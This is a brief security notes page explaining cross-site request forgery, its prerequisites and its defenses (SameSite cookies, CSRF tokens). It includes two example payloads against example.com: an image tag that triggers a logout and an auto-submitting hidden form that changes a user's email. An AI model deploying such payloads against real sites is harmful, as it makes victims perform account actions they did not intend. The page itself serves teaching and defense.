---
title: CSRF - Cross Site Request Forgery
description: Introduction Cross Site Request Forgery
---

## Introduction

A CSRF allows an attacker to make victims to perform actions that they do not intend to perform.

## Pre-requisites

1. Cookie-based session handling.
2. No unpredictable request parameters.

## Defenses

1. Use the `SameSite` cookie attribute to :
    - `Strict` : the browser will **not** include the cookie in any requests that originate from another site.
    - `Lax` :  the browser will include the cookie in requests that originate from another site but only if **two conditions** are met : GET method and the request resulted from a top-level navigation by the user, such as clicking a link (not requests by JS).
2. Use random CSRF Token.

## Payloads

### GET

```html
<img src="https://example.com/logout">
```

### POST

```html
<form method="POST" action="https://example.com/email">
    <input type="hidden" name="email" value="hello@hello.com">
    <input type="hidden" name="csrf" value="0KL98nyeTFWocYvP8q9RHGrIt9IYn1Q7">
</form>
<script>
        document.forms[0].submit();
</script>
```

## References

- https://portswigger.net/web-security/csrf
- https://portswigger.net/web-security/csrf/samesite-cookies
